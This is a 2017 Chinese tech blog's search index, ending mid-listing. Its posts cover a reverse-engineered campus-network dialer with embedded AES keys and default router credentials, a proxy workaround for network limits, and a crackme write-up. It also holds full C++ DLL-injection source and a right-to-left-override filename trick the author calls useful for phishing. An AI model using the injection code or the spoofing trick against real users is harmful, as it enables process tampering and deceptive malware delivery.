<?xml version="1.0" encoding="utf-8"?>
<search>
  
    
    <entry>
      <title><![CDATA[湖北掌大协议拨号Python脚本]]></title>
      <url>%2F2017%2F12%2F15%2FHubei-Exin-portal-Python-Script.html</url>
      <content type="text"><![CDATA[湖北定制版协议拨号本来之前我e信账号被加小黑屋就没弄了，没想到又被放出小黑屋了，可以上了据说1月份换协议，且用且珍惜，另外感谢陈大的项目 使用的第三方库123requestsBeautifulSoup4wxPython 支持老毛子固件（登录账号密码均为admin），如果不是老毛子请手动填写路由器wan口获取的ip123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208import wximport wx.xrcimport reimport sysimport osimport requestsimport binasciiimport timefrom Cryptodome.Cipher import AESfrom requests.auth import HTTPBasicAuth############################################################################# Class MyFrame1###########################################################################class HubeiPortal: AES_KEY_PASSWORD = "pass012345678910" AES_KEY_SESSION = "jyangzi5@163.com" def __init__(self, username, password, localIpAddress, useragent): self.UserName = username self.Password = password self.Headers = &#123; 'Charset': 'UTF-8', 'Content-Type': 'application/x-www-form-urlencoded', 'App': 'HBZD', 'User-Agent': useragent, #'User-Agent': 'Mozilla/Android/6.0.1/SM-G9250/ffffffff-f56d-7f76-ffff-ffffd097bd08', &#125; self.Host = '58.53.196.165:8080' self.LocalIpAddress = localIpAddress self.AccessToken = '' self.Cookie = &#123;&#125; def getSecret(self): url = 'http://' + self.Host + '/wf.do?clientType=android&amp;code=1&amp;version=6.0.1&amp;clientip=' + self.LocalIpAddress # url=http://58.53.196.165:8080/wf.do?device=Phone%3ALetv+X620%5CSDK%3A23&amp;clientType=android&amp;code=1&amp;version=6.0&amp;clientip=100.64.64.76 hRequest = requests.get(url, headers=self.Headers, timeout=10) self.AccessToken = self.parseToHtml(hRequest) self.Cookie['JSESSIONID'] = hRequest.cookies['JSESSIONID'] def authenticate(self): url = 'http://' + self.Host + '/wf.do' postData = &#123; 'password': self.getPasswordEnc(self.Password), 'clientType': 'android', 'username': self.UserName, 'key': self.getSessionEnc(self.AccessToken), 'code': 8, 'clientip': self.LocalIpAddress, &#125; hRequest = requests.post(url, data=postData, cookies=self.Cookie, headers=self.Headers) resp = self.parseToHtml(hRequest) return resp def getPasswordEnc(self, sPasswd): return self.toHex(self.aesEcbEnc(sPasswd, self.AES_KEY_PASSWORD)) def getSessionEnc(self, sSession): return self.toHex(self.aesEcbEnc(sSession, self.AES_KEY_SESSION)) def aesEcbEnc(self, sText, aes_key): aes_key = bytes(aes_key, encoding='utf-8') sText = bytes(sText, encoding='utf-8') cipher = AES.new(aes_key, AES.MODE_ECB) if len(sText) &lt;= 16: while len(sText) % 16 != 0: sText += b'\n' else: while len(sText) % 48 != 0: sText += b'\x10' cipher_text = cipher.encrypt(sText) return cipher_text def toHex(self, sEncrypt): return binascii.b2a_hex(sEncrypt).decode('utf-8').upper() def parseToHtml(self, hRequest): return hRequest.text def Connect(self): self.getSecret() return self.authenticate()class MyFrame1 ( wx.Frame ): def __init__( self, parent ): wx.Frame.__init__ ( self, parent, id = wx.ID_ANY, title = u"snk", pos = wx.DefaultPosition, size = wx.Size( 246,246 ), style = wx.DEFAULT_FRAME_STYLE|wx.TAB_TRAVERSAL ) self.SetSizeHints( wx.DefaultSize, wx.DefaultSize ) fgSizer2 = wx.FlexGridSizer( 0, 2, 0, 0 ) fgSizer2.SetFlexibleDirection( wx.BOTH ) fgSizer2.SetNonFlexibleGrowMode( wx.FLEX_GROWMODE_SPECIFIED ) self.m_staticText2 = wx.StaticText( self, wx.ID_ANY, u"账号", wx.DefaultPosition, wx.DefaultSize, 0 ) self.m_staticText2.Wrap( -1 ) fgSizer2.Add( self.m_staticText2, 0, wx.ALL, 5 ) self.m_textCtrl4 = wx.TextCtrl( self, wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 ) fgSizer2.Add( self.m_textCtrl4, 0, wx.ALL, 5 ) self.m_staticText3 = wx.StaticText( self, wx.ID_ANY, u"密码", wx.DefaultPosition, wx.DefaultSize, 0 ) self.m_staticText3.Wrap( -1 ) fgSizer2.Add( self.m_staticText3, 0, wx.ALL, 5 ) self.m_textCtrl5 = wx.TextCtrl( self, wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, wx.TE_PASSWORD ) fgSizer2.Add( self.m_textCtrl5, 0, wx.ALL, 5 ) self.m_staticText4 = wx.StaticText( self, wx.ID_ANY, u"UA", wx.DefaultPosition, wx.DefaultSize, 0 ) self.m_staticText4.Wrap( -1 ) fgSizer2.Add( self.m_staticText4, 0, wx.ALL, 5 ) self.m_textCtrl6 = wx.TextCtrl( self, wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 ) fgSizer2.Add( self.m_textCtrl6, 0, wx.ALL, 5 ) self.m_staticText5 = wx.StaticText( self, wx.ID_ANY, u"内网IP", wx.DefaultPosition, wx.DefaultSize, 0 ) self.m_staticText5.Wrap( -1 ) fgSizer2.Add( self.m_staticText5, 0, wx.ALL, 5 ) self.m_textCtrl7 = wx.TextCtrl( self, wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 ) fgSizer2.Add( self.m_textCtrl7, 0, wx.ALL, 5 ) self.m_checkBox1 = wx.CheckBox( self, wx.ID_ANY, u"记住信息", wx.DefaultPosition, wx.DefaultSize, 0 ) fgSizer2.Add( self.m_checkBox1, 0, wx.ALL|wx.EXPAND, 5 ) self.m_button1 = wx.Button( self, wx.ID_ANY, u"点击更新IP(需2s)", wx.DefaultPosition, wx.DefaultSize, 0 ) fgSizer2.Add( self.m_button1, 0, wx.ALL|wx.EXPAND, 5 ) self.m_button2 = wx.Button( self, wx.ID_ANY, u"开始连接", wx.DefaultPosition, wx.DefaultSize, 0 ) fgSizer2.Add( self.m_button2, 0, wx.ALL|wx.EXPAND, 5 ) self.SetSizer( fgSizer2 ) self.Layout() self.Centre( wx.BOTH ) # Connect Events r_internet = requests.get('http://192.168.1.1/status_wanlink.asp', headers=&#123;'Authorization':'Basic YWRtaW46YWRtaW4='&#125;) ip4_wan = re.search(r"function\ wanlink\_ip4\_wan\(\)\ \&#123; return\ \'(\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;)\'\;\&#125;", r_internet.text).group(1) self.m_textCtrl7.SetValue(ip4_wan) # get info from config file if os.path.exists("SnkGui.ini"): for line in open("SnkGui.ini",'r'): config = line.split(' : ') if config[0] == 'username': self.m_textCtrl4.SetValue(config[1].strip()) if config[0] == 'password': self.m_textCtrl5.SetValue(config[1].strip()) if config[0] == 'useragent': self.m_textCtrl6.SetValue(config[1].strip()) self.m_checkBox1.Bind( wx.EVT_CHECKBOX, self.SaveConfig ) self.m_button1.Bind( wx.EVT_BUTTON, self.getWANIP4 ) self.m_button2.Bind( wx.EVT_BUTTON, self.Connect ) def __del__( self ): pass # Virtual event handlers, overide them in your derived class def SaveConfig( self, event ): with open("SnkGui.ini",'w') as f: config = [] config.append('username : '+self.m_textCtrl4.GetValue() + '\n') config.append('password : '+self.m_textCtrl5.GetValue() + '\n') config.append('useragent : '+self.m_textCtrl6.GetValue() + '\n') f.writelines(config) # get ip4_wan from 192.168.1.1(老毛子路由器) def getWANIP4( self, event ): headers = &#123; # 其中YWRtaW46YWRtaW4=是admin:admin（路由器账号密码）的base64编码，可以自己根据格式进行编码修改 'Authorization' : 'Basic YWRtaW46YWRtaW4=', &#125; payload = &#123; 'wan_action' : 'Connect', 'modem_prio' : '1', &#125; r_reconnect = requests.post('http://192.168.1.1/device-map/wan_action.asp', headers=headers, data=payload) time.sleep(2) r_internet = requests.get('http://192.168.1.1/status_wanlink.asp', headers=headers) ip4_wan = re.search(r"function\ wanlink\_ip4\_wan\(\)\ \&#123; return\ \'(\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;)\'\;\&#125;", r_internet.text).group(1) self.m_textCtrl7.SetValue(ip4_wan) def Connect( self, event ): username = self.m_textCtrl4.GetValue() password = self.m_textCtrl5.GetValue() localIpAddress = self.m_textCtrl7.GetValue() useragent = self.m_textCtrl6.GetValue() eXin = HubeiPortal(username,password,localIpAddress,useragent) ConnInfo = eXin.Connect() if "auth00" in ConnInfo: wx.MessageBox(u"连接成功") else: wx.MessageBox(ConnInfo)def main(): app = wx.App(False) frame = MyFrame1(None) frame.Show(True) #start the applications app.MainLoop() if __name__ == '__main__': main() 供测试UA1Mozilla/Android/6.0.1/SM-G925f/ffffffff-f78d-7f76-ffff-ffffd097bd08 其中SM-G925f(格式不限)与ffffffff-f78d-7f76-ffff-ffffd097bd08(格式需相同)均可修改 如果不是老毛子，ip获取不到，直接手动填写ip即可]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[e信与酸酸结合开wifi使用路由器上网]]></title>
      <url>%2F2017%2F11%2F12%2Fexin-ssserver.html</url>
      <content type="text"><![CDATA[关于e信“正常情况下”使用路由器网上是有方法的，入户线插上lan，电脑接lan拨号我想要说的是连接e信后使用路由器上网，并且是绝对正常的思维手机也是可以连接上wifi，但是手机上连接wifi后的ip地址不是我们的路由器分配和路由器网关，我们改掉，使手机与电脑处于同一网关然后电脑开ssserver（这玩意是什么不用我多说，其实你也可以电脑搭建http proxy server（比如使用cow），然后手机连接wifi设置直接通过代理，但是对于纯tcp和udp就无能为力了）手机连接电脑ssserver，可以上网了，通过开debug模式可以发现走的是电脑ssserver上网具体的小白详细教程做法看心情和时间吧]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[golang解析json配置文件]]></title>
      <url>%2F2017%2F10%2F25%2Fgolang%E8%A7%A3%E6%9E%90json%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.html</url>
      <content type="text"><![CDATA[突然想起来自己以前写的，golang写的一个简易的json解析器，分享一下 安装1go get github.com/akkuman/parseConfig 使用说明 环境假设123.├── config.go├── config.json config.json内容 12345678&#123; "name" : "akkuman", "urls" : ["xx.com","ww.com"], "info" : &#123; "qq" : "123456", "weixin": "123456" &#125;&#125; 该库取出来的都是类型为interface{}的数据，如需取出具体类型的数据需要自己加断言 当取嵌套map数据的时候，以“ &gt; ”指定下一级，注意&gt;两边均有空格，具体见下面的例子 例子config.go内容 123456789101112131415161718192021222324package mainimport ( &quot;github.com/akkuman/parseConfig&quot;)func main() &#123; var config = parseConfig.New(&quot;config.json&quot;) // 此为interface&#123;&#125;格式数据 var name = config.Get(&quot;name&quot;) // 断言 var nameString = name.(string) // 取数组 var urls = config.Get(&quot;urls&quot;).([]interface&#123;&#125;) var urlsString []string for _,v := range urls &#123; urlsString = append(urlsString, v.(string)) &#125; // 取嵌套map内数据 var qq = config.Get(&quot;info &gt; qq&quot;).(&quot;string&quot;) var weixin = config.Get(&quot;info &gt; weixin&quot;).(&quot;string&quot;)&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[dll注入到指定进程]]></title>
      <url>%2F2017%2F10%2F24%2Fdll%E6%B3%A8%E5%85%A5%E5%88%B0%E6%8C%87%E5%AE%9A%E8%BF%9B%E7%A8%8B.html</url>
      <content type="text"><![CDATA[talk is cheap,show me code代码有详细注释，文章底部提示了一些坑 主程序123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121#include "stdafx.h"#include &lt;windows.h&gt;#include &lt;iostream&gt;#include &lt;tlhelp32.h&gt;#include &lt;tchar.h&gt;using namespace std;int EnableDebugPriv(char* name)&#123; HANDLE hToken; TOKEN_PRIVILEGES tp; LUID luid; //打开进程令牌环 OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken); //获得进程本地唯一ID LookupPrivilegeValue(NULL, name, &amp;luid); tp.PrivilegeCount = 1; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; tp.Privileges[0].Luid = luid; //调整权限 AdjustTokenPrivileges(hToken, 0, &amp;tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL); return 0;&#125;//*****************************************************************************************************************************BOOL InjectDll(LPCSTR DllFullPath, const DWORD dwRemoteProcessId)&#123; // 提升权限(必须管理员身份) EnableDebugPriv(SE_DEBUG_NAME); //打开远程线程 HANDLE hRemoteProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwRemoteProcessId); if (hRemoteProcess == NULL) &#123; cout &lt;&lt; "Error: OpenProcess failed!\n" &lt;&lt; endl; return FALSE; &#125; //使用VirtualAllocEx函数在远程进程的内存地址空间分配DLL文件名空间 LPVOID pszLibFileRemote = VirtualAllocEx(hRemoteProcess, NULL, lstrlen(DllFullPath) + 1, MEM_COMMIT, PAGE_READWRITE); if (pszLibFileRemote == NULL) &#123; CloseHandle(hRemoteProcess); cout &lt;&lt; "Error: VirtualAllocEx failed!\n" &lt;&lt; endl; return FALSE; &#125; //使用WriteProcessMemory函数将DLL的路径名写入到远程进程的内存空间 if (!WriteProcessMemory(hRemoteProcess, pszLibFileRemote, DllFullPath, lstrlen(DllFullPath) + 1, NULL)) &#123; CloseHandle(hRemoteProcess); cout &lt;&lt; "Error: WriteProcessMemory failed!\n" &lt;&lt; endl; return FALSE; &#125; //启动远程线程LoadLibraryA，通过远程线程调用创建新的线程 HANDLE hRemoteThread; if ((hRemoteThread = CreateRemoteThread(hRemoteProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pszLibFileRemote, 0, NULL)) == NULL) &#123; CloseHandle(hRemoteProcess); cout &lt;&lt; "Error: the remote thread could not be created.\n" &lt;&lt; endl; return FALSE; &#125; else &#123; // 等待线程退出 要设置超时 以免远程线程挂起导致程序无响应 //WaitForSingleObject(hRemoteThread, 10000); // 如果等待线程 DLL中的DllMain不要写MessageBox cout &lt;&lt; "Success: the remote thread was successfully created.\n" &lt;&lt; endl; &#125; // 释放句柄 CloseHandle(hRemoteProcess); CloseHandle(hRemoteThread); return TRUE;&#125;// 根据进程名称获取进程IDDWORD FindTarget(LPCSTR lpszProcess)&#123; DWORD dwRet = 0; HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 pe32; pe32.dwSize = sizeof(PROCESSENTRY32 ); Process32First(hSnapshot, &amp;pe32 ); do &#123; if (lstrcmpi(pe32.szExeFile, lpszProcess) == 0) &#123; dwRet = pe32.th32ProcessID; break; &#125; &#125; while (Process32Next(hSnapshot, &amp;pe32)); CloseHandle(hSnapshot); return dwRet; &#125;//*****************************************************************************************************************************int main()&#123; DWORD id = FindTarget((LPCSTR)"calc.exe"); cout &lt;&lt; id &lt;&lt; endl; // 获取可执行文件所在目录 TCHAR szFilePath[MAX_PATH + 1]; GetModuleFileName(NULL, szFilePath, MAX_PATH); *(_tcsrchr(szFilePath, '\\')) = 0; _tcscat_s(szFilePath, sizeof(szFilePath), "\\dll.dll"); cout &lt;&lt; szFilePath &lt;&lt; endl; InjectDll(szFilePath, id);//这个数字是你想注入的进程的ID号 return 0;&#125; dllmain123456789101112131415161718192021222324252627282930313233343536// dllmain.cpp : 定义 DLL 应用程序的入口点。#include "stdafx.h"#include &lt;iostream&gt;using namespace std;BOOL APIENTRY DllMain(HINSTANCE hInst /* Library instance handle. */, DWORD reason /* Reason this function is being called. */, LPVOID reserved /* Not used. */)&#123; switch (reason) &#123; case DLL_PROCESS_ATTACH: //当这个DLL被映射到了进程的地址空间时 MessageBox(0, TEXT("From DLL\n"), TEXT("Process Attach"), MB_ICONINFORMATION); cout &lt;&lt; "Process Attach" &lt;&lt; endl; break; case DLL_PROCESS_DETACH: //这个DLL从进程的地址空间中解除映射 MessageBox(0, TEXT("From DLL\n"), TEXT("Process Detach"), MB_ICONINFORMATION); cout &lt;&lt; "Process Detach" &lt;&lt; endl; break; case DLL_THREAD_ATTACH: //一个线程正在被创建 MessageBox(0, TEXT("From DLL\n"), TEXT("Thread Attach"), MB_ICONINFORMATION); cout &lt;&lt; "Thread Attach" &lt;&lt; endl; break; case DLL_THREAD_DETACH: //线程终结 MessageBox(0, TEXT("From DLL\n"), TEXT("Thread Detach"), MB_ICONINFORMATION); cout &lt;&lt; "Thread Detach" &lt;&lt; endl; break; &#125; return TRUE;&#125; 需要注意的地方 环境是vs，字符集是多字节 这份代码中的hRemoteThread = CreateRemoteThread(hRemoteProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pszLibFileRemote, 0, NULL)中的也可采用GetProcAddress函数 这份代码并不是通用注入代码（如果需要通用需要自行解析pe头结构从中取出kernel32.dll的GetProcAddress地址）,所以64位windows上需要把vs设置为编译x64]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[从右向左覆盖实现恶意软件扩展名欺骗]]></title>
      <url>%2F2017%2F10%2F24%2F%E4%BB%8E%E5%8F%B3%E5%90%91%E5%B7%A6%E8%A6%86%E7%9B%96%E5%AE%9E%E7%8E%B0%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E6%AC%BA%E9%AA%97.html</url>
      <content type="text"><![CDATA[这个技术虽然老掉牙，但在网络钓鱼中非常好用 目录结构121.pyrc_srceen.exe py文件内容123import osname = "\u202Excod.exe"os.rename(os.path.join(os.getcwd(),'re_screen.exe'),os.path.join(os.getcwd(),"re_screen"+name)) 执行后 原理Unicode包含若干个特殊字符串，允许在正常情况下从左到右的文本中插入从右到左的文字.其中一个右到左覆写字符串就是“U+202E”详见千万小心从右向左覆盖技术 恶意软件经常用这个方法骗用户]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[静态博客阅读次数与评论解决方案]]></title>
      <url>%2F2017%2F10%2F23%2F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2%E9%98%85%E8%AF%BB%E6%AC%A1%E6%95%B0%E4%B8%8E%E8%AF%84%E8%AE%BA%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88.html</url>
      <content type="text"><![CDATA[基于LeanCloud的文章阅读次数统计插件https://github.com/Weic96/LeanStatistics.js 基于LeanCloud的文章评论https://github.com/xCss/Valine]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Tuts4you注册问题解码]]></title>
      <url>%2F2017%2F09%2F24%2FTuts4you-register.html</url>
      <content type="text"><![CDATA[只说一个，是八进制,下面是解码脚本环境python3 12345678910111213# -*-coding:utf-8-*-# Author: Akkuman# Blog: hacktech.cn# Tust4You的问题是八进制,所以八进制转ascii即可# 解码问题print("Please input the code what you see on register's page of Tust 4 You:")encode_code = input()encode_list = encode_code.split()print("\nthe question is\n")for i in encode_list: i = int(i,8) print(chr(i), end="")]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[一个查表置换的CM]]></title>
      <url>%2F2017%2F09%2F20%2F%E4%B8%80%E4%B8%AA%E6%9F%A5%E8%A1%A8%E7%BD%AE%E6%8D%A2%E7%9A%84CM.html</url>
      <content type="text"><![CDATA[说实话，今天被自己蠢哭了 因为看多了一个字符，以为是输入字符变形后的base64编码，也怪自己没大致看过base64汇编形式，把base64跟完了用py实现完算法才意思到是base64，这是题外话本人初学者，两天或一天一个cm练练，大家可以与我交流akkumans@qq.com，我博客 上面的题外话就是今天搞的一个cm，被自己蠢哭了，不过也算是base64编码流程无比清晰了，不算是无用功 这个cm是一个控制台的，丢到xp无法运行，本机只装了x64dbg(x32dbg)，用这个调试软件来试试吧123C:\Users\Administrator\Desktop&gt;reverse3.exePlease enter the flag:97103012wrong input 字符串搜索，找到判断的地方123456789101112131401241269 | 85 C0 | test eax,eax | zf=1 =&gt; eax=00124126B | 75 07 | jne reverse3.1241274 |0124126D | 68 78 21 24 01 | push reverse3.1242178 | 1242178:&quot;this is the right flag&quot;01241272 | EB 05 | jmp reverse3.1241279 |01241274 | 68 90 21 24 01 | push reverse3.1242190 | 1242190:&quot;wrong input&quot;01241279 | FF 15 B0 20 24 01 | call dword ptr ds:[&lt;&amp;puts&gt;] |0124127F | 8B 4D FC | mov ecx,dword ptr ss:[ebp-4] |01241282 | 83 C4 04 | add esp,4 |01241285 | 33 CD | xor ecx,ebp |01241287 | 33 C0 | xor eax,eax | eax:&quot;OTacMDMzMTI=&quot;01241289 | E8 92 00 00 00 | call reverse3.1241320 |0124128E | 8B E5 | mov esp,ebp |01241290 | 5D | pop ebp |01241291 | C3 | ret | 可以看到要得到flag，jne就不能跳，也就是test eax,eax后的ZF=1，也就是eax=0那这个eax=0从何而来？我们接着往上看12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485012411A0 | 55 | push ebp |012411A1 | 8B EC | mov ebp,esp |012411A3 | 83 EC 44 | sub esp,44 |012411A6 | A1 04 30 24 01 | mov eax,dword ptr ds:[1243004] | eax:&quot;OTacMDMzMTI=&quot;012411AB | 33 C5 | xor eax,ebp |012411AD | 89 45 FC | mov dword ptr ss:[ebp-4],eax |012411B0 | 0F 57 C0 | xorps xmm0,xmm0 |012411B3 | C7 45 F8 00 00 00 00 | mov dword ptr ss:[ebp-8],0 |012411BA | 68 58 21 24 01 | push reverse3.1242158 | 1242158:&quot;Please enter the flag:&quot;012411BF | 0F 11 45 E8 | movups xmmword ptr ss:[ebp-18],xmm0 |012411C3 | 0F 11 45 C0 | movups xmmword ptr ss:[ebp-40],xmm0 |012411C7 | 0F 11 45 D0 | movups xmmword ptr ss:[ebp-30],xmm0 |012411CB | 66 0F D6 45 E0 | movq qword ptr ss:[ebp-20],xmm0 |012411D0 | E8 1B 01 00 00 | call reverse3.12412F0 |012411D5 | 8D 45 E8 | lea eax,dword ptr ss:[ebp-18] |012411D8 | 50 | push eax | eax:&quot;OTacMDMzMTI=&quot;012411D9 | 68 70 21 24 01 | push reverse3.1242170 | 1242170:&quot;%20s&quot;012411DE | E8 CD 00 00 00 | call reverse3.12412B0 |012411E3 | 8D 4D E8 | lea ecx,dword ptr ss:[ebp-18] | 你的输入 -&gt; ecx012411E6 | 83 C4 0C | add esp,C |012411E9 | 8D 51 01 | lea edx,dword ptr ds:[ecx+1] | 你的输入减第一个字节 -&gt; edx012411EC | 0F 1F 40 00 | nop dword ptr ds:[eax] | eax:&quot;OTacMDMzMTI=&quot;012411F0 | 8A 01 | mov al,byte ptr ds:[ecx] |012411F2 | 41 | inc ecx |012411F3 | 84 C0 | test al,al |012411F5 | 75 F9 | jne reverse3.12411F0 |012411F7 | 2B CA | sub ecx,edx | 你的输入的长度 -&gt; ecx012411F9 | 8D 55 E8 | lea edx,dword ptr ss:[ebp-18] | 输入 -&gt; edx012411FC | 56 | push esi | esi:&quot;TacMDMzMTI=&quot;012411FD | 51 | push ecx |012411FE | 51 | push ecx |012411FF | 8D 4D C0 | lea ecx,dword ptr ss:[ebp-40] |01241202 | E8 F9 FD FF FF | call reverse3.1241000 | base64(你的输入) -&gt; [ebp - 0x40]01241207 | 8D 4D C0 | lea ecx,dword ptr ss:[ebp-40] |0124120A | 83 C4 08 | add esp,8 |0124120D | 33 D2 | xor edx,edx |0124120F | 8D 71 01 | lea esi,dword ptr ds:[ecx+1] | esi:&quot;TacMDMzMTI=&quot;01241212 | 8A 01 | mov al,byte ptr ds:[ecx] |01241214 | 41 | inc ecx |01241215 | 84 C0 | test al,al |01241217 | 75 F9 | jne reverse3.1241212 |01241219 | 2B CE | sub ecx,esi | 长度（base64你的输入） -&gt; ecx0124121B | 74 37 | je reverse3.1241254 |0124121D | 0F 1F 00 | nop dword ptr ds:[eax] | eax:&quot;OTacMDMzMTI=&quot;01241220 | 8A 4C 15 C0 | mov cl,byte ptr ss:[ebp+edx-40] |01241224 | 33 C0 | xor eax,eax | eax:&quot;OTacMDMzMTI=&quot;01241226 | 3A 88 08 21 24 01 | cmp cl,byte ptr ds:[eax+1242108] |0124122C | 74 08 | je reverse3.1241236 |0124122E | 40 | inc eax | eax:&quot;OTacMDMzMTI=&quot;0124122F | 83 F8 1A | cmp eax,1A | eax:&quot;OTacMDMzMTI=&quot;01241232 | 72 F2 | jb reverse3.1241226 |01241234 | EB 0A | jmp reverse3.1241240 |01241236 | 8A 80 24 21 24 01 | mov al,byte ptr ds:[eax+1242124] |0124123C | 88 44 15 C0 | mov byte ptr ss:[ebp+edx-40],al |01241240 | 8D 4D C0 | lea ecx,dword ptr ss:[ebp-40] |01241243 | 42 | inc edx |01241244 | 8D 71 01 | lea esi,dword ptr ds:[ecx+1] | esi:&quot;TacMDMzMTI=&quot;01241247 | 8A 01 | mov al,byte ptr ds:[ecx] |01241249 | 41 | inc ecx |0124124A | 84 C0 | test al,al |0124124C | 75 F9 | jne reverse3.1241247 |0124124E | 2B CE | sub ecx,esi | esi:&quot;TacMDMzMTI=&quot;01241250 | 3B D1 | cmp edx,ecx |01241252 | 72 CC | jb reverse3.1241220 |01241254 | 6A 14 | push 14 |01241256 | 8D 45 C0 | lea eax,dword ptr ss:[ebp-40] |01241259 | 68 40 21 24 01 | push reverse3.1242140 | 1242140:&quot;o2Ffx3V0OjJtYW5spQ==&quot;0124125E | 50 | push eax | eax:&quot;OTacMDMzMTI=&quot;0124125F | FF 15 C4 20 24 01 | call dword ptr ds:[&lt;&amp;strncmp&gt;] | 经过处理的base64与内置base64值比较，相等=&gt;eax=001241265 | 83 C4 0C | add esp,C |01241268 | 5E | pop esi | esi:&quot;TacMDMzMTI=&quot;01241269 | 85 C0 | test eax,eax | zf=1 =&gt; eax=00124126B | 75 07 | jne reverse3.1241274 |0124126D | 68 78 21 24 01 | push reverse3.1242178 | 1242178:&quot;this is the right flag&quot;01241272 | EB 05 | jmp reverse3.1241279 |01241274 | 68 90 21 24 01 | push reverse3.1242190 | 1242190:&quot;wrong input&quot;01241279 | FF 15 B0 20 24 01 | call dword ptr ds:[&lt;&amp;puts&gt;] |0124127F | 8B 4D FC | mov ecx,dword ptr ss:[ebp-4] |01241282 | 83 C4 04 | add esp,4 |01241285 | 33 CD | xor ecx,ebp |01241287 | 33 C0 | xor eax,eax | eax:&quot;OTacMDMzMTI=&quot;01241289 | E8 92 00 00 00 | call reverse3.1241320 |0124128E | 8B E5 | mov esp,ebp |01241290 | 5D | pop ebp |01241291 | C3 | ret | 看来是这几行做了手脚，压入了两个参数12301241259 | 68 40 21 24 01 | push reverse3.1242140 | 1242140:&quot;o2Ffx3V0OjJtYW5spQ==&quot;0124125E | 50 | push eax | eax:&quot;OTacMDMzMTI=&quot;0124125F | FF 15 C4 20 24 01 | call dword ptr ds:[&lt;&amp;strncmp&gt;] | 经过处理的base64与内置base64值比较，相等=&gt;eax=0 我们跟这个call进去看看1234567891011121314151617181920212223242526272829303132333435363738394041424344454647486C2F8C30 | 53 | push ebx |6C2F8C31 | 56 | push esi | esi:&quot;TacMDMzMTI=&quot;6C2F8C32 | 8B 4C 24 0C | mov ecx,dword ptr ss:[esp+C] | 我们输入的base64变形后的值6C2F8C36 | 8B 54 24 10 | mov edx,dword ptr ss:[esp+10] | 内置base64值6C2F8C3A | 8B 5C 24 14 | mov ebx,dword ptr ss:[esp+14] |6C2F8C3E | F7 C3 FF FF FF FF | test ebx,FFFFFFFF |6C2F8C44 | 74 50 | je ucrtbase.6C2F8C96 |6C2F8C46 | 2B CA | sub ecx,edx |6C2F8C48 | F7 C2 03 00 00 00 | test edx,3 |6C2F8C4E | 74 17 | je ucrtbase.6C2F8C67 |6C2F8C50 | 0F B6 04 0A | movzx eax,byte ptr ds:[edx+ecx] | edx+ecx*1:&quot;OTacMDMzMTI=&quot;6C2F8C54 | 3A 02 | cmp al,byte ptr ds:[edx] |6C2F8C56 | 75 48 | jne ucrtbase.6C2F8CA0 |6C2F8C58 | 85 C0 | test eax,eax | eax:&quot;OTacMDMzMTI=&quot;6C2F8C5A | 74 3A | je ucrtbase.6C2F8C96 |6C2F8C5C | 42 | inc edx |6C2F8C5D | 83 EB 01 | sub ebx,1 |6C2F8C60 | 76 34 | jbe ucrtbase.6C2F8C96 |6C2F8C62 | F6 C2 03 | test dl,3 |6C2F8C65 | 75 E9 | jne ucrtbase.6C2F8C50 |6C2F8C67 | 8D 04 0A | lea eax,dword ptr ds:[edx+ecx] | eax:&quot;OTacMDMzMTI=&quot;6C2F8C6A | 25 FF 0F 00 00 | and eax,FFF | eax:&quot;OTacMDMzMTI=&quot;6C2F8C6F | 3D FC 0F 00 00 | cmp eax,FFC | eax:&quot;OTacMDMzMTI=&quot;6C2F8C74 | 77 DA | ja ucrtbase.6C2F8C50 |6C2F8C76 | 8B 04 0A | mov eax,dword ptr ds:[edx+ecx] | eax:&quot;OTacMDMzMTI=&quot;6C2F8C79 | 3B 02 | cmp eax,dword ptr ds:[edx] | eax:&quot;OTacMDMzMTI=&quot;6C2F8C7B | 75 D3 | jne ucrtbase.6C2F8C50 |6C2F8C7D | 83 EB 04 | sub ebx,4 |6C2F8C80 | 76 14 | jbe ucrtbase.6C2F8C96 |6C2F8C82 | 8D B0 FF FE FE FE | lea esi,dword ptr ds:[eax-1010101] | esi:&quot;TacMDMzMTI=&quot;6C2F8C88 | 83 C2 04 | add edx,4 |6C2F8C8B | F7 D0 | not eax | eax:&quot;OTacMDMzMTI=&quot;6C2F8C8D | 23 C6 | and eax,esi | eax:&quot;OTacMDMzMTI=&quot;, esi:&quot;TacMDMzMTI=&quot;6C2F8C8F | A9 80 80 80 80 | test eax,80808080 | eax:&quot;OTacMDMzMTI=&quot;6C2F8C94 | 74 D1 | je 